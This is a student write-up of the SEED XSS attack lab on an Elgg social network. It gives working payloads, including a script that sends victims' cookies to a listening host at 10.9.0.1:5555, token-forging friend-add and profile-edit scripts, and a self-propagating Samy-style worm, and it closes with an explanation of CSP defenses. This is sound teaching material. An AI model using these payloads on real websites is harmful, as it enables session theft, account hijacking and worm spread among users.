# XSS Attack Lab on Elgg WebApp - Alex Baron

## Task 1: Posting a Malicious Message to Display an Alert Window

```html
<script> alert('XSS'); </script>
<!-- Or, by saving a standalone file: -->
<script type="text/javascript" src="http://www.example.com/myscripts.js">
</script>
```

## Task 2: Posting a Malicious Message to Display Cookies

```html
<script> alert(document.cookie); </script>
```

## Task 3: Stealing Cookies from the Victim's Machine

```html
<script>
 document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie)+ '>') 
</script>
```

And listen to the incoming request:
> nc -lknv 5555

## Task 4: Becoming the Victim’s Friend

The correct lines of code to complete the task is the following:

```html
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var sendurl= "http://www.seed-server.com/action/friends/add?friend=59" + token + ts;
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

1. Both *elgg.security.token.__elgg_ts* and *elgg.security.token.__elgg_token* are used to get the parameters of *ts* and *token* that are needed to send the correct GET request and so the friend request. These parameters are part of the *elgg* object.
2. With *Editor Mode* only it is not possible to inject a working script because this mode automatically adds html elements into the script to adapt the text to the formatting. Thus, the script won't work. A possible solution could be to host a .js file or by intercepting the POST request sent when modifying the profile and can edit the escaped content.

## Task 5: Modifying the Victim's Profile

By looking at the POST request to modifying the profile we can build the following code:

```js
window.onload = function() {
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    
    var content = token + ts + userName + "&description=Hi I'm Samy" + guid;
    var samyGuid = 59;
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    
    if(elgg.session.user.guid != samyGuid) {
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
```

In this way, whoever access Samy's profile will find his *About me* section modified with the text "Hi I'm Samy".
Line (1) is for Samy not to make this attack on himself. Removing this line and entering with Samy in his profile, he will find the modified profile and the code for the attack deleted by the new text "Hi I'm Samy".

## Task 6: Writing a Self-Propagating XSS Worm

Code of the worm:

```html
<script type="text/javascript" id="worm">
    window.onload = function() {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";

        //Pull the pieces togheter and apply the URI encoding
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var description = "&description=Hi I'm Samy";
        
        var content = token + ts + userName + description + wormCode + guid;
        var samyGuid = 59;
        var sendurl_friend = "http://www.seed-server.com/action/friends/add?friend=59" + token + ts;
        var sendurl_profile = "http://www.seed-server.com/action/profile/edit";
        
        if(elgg.session.user.guid != samyGuid) {
            var Ajax=null;
            Ajax = new XMLHttpRequest();         
            Ajax.open("GET", sendurl_friend, true);
            Ajax.send();

            Ajax = new XMLHttpRequest();   
            Ajax.open("POST", sendurl_profile, true);
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
```

## Task 7: Defeating XSS Attacks Using CSP

1. In the first website (example32a.com) we can see that every script is loaded succesfully because no CSP's directive is set. For the second website (example32b.com) it is possibile to see by the configuration file that *default-src* and *script-src* directives are set. The directive *script-src* specifies valid sources for JavaScript and includes not only < script > elements but also inline script event handlers. Thus, area1, 2, 3 and 7 failed to load (which are inline scripts). The directive script-src 'self' \*.example70.com only allows scripts from the same origin and from \*.example70.com, so area4 is loaded successfully. Furthermore area6 is ok and area5 fails because this section tries to load a script from www.example60.com.
For the third website (www.example32c.com) we can see that the CSP configuration is done by the web applications. The only difference with the second website is that the directive script-src 'self' 'nonce-111-111-111' *.example70.com allows the first area to be loaded. The nonce attribute, which can be used by CSP, is useful to allow-list specific elements, such as a particular inline script.

2. As stated above the *script-src* directive blocks also inline script event handlers (onlick) so in the second and third website the button doesn't work.

3. Area5 and 6 will display ok with the following directive: script-src 'self' \*.example60.com \*.example70.com.

4. With the following directive we get the desired result: script-src 'self' 'nonce-111-111-111' 'nonce-222-222-222' \*.example60.com \*.example70.com.

5. Disallowing inline styles and inline scripts is one of the biggest security wins CSP provides. CSP response header allows web site administrators to control resources the user agent is allowed to load for a given page. With a few exceptions, policies mostly involve specifying server origins and script endpoints. This helps guard against cross-site scripting attacks.
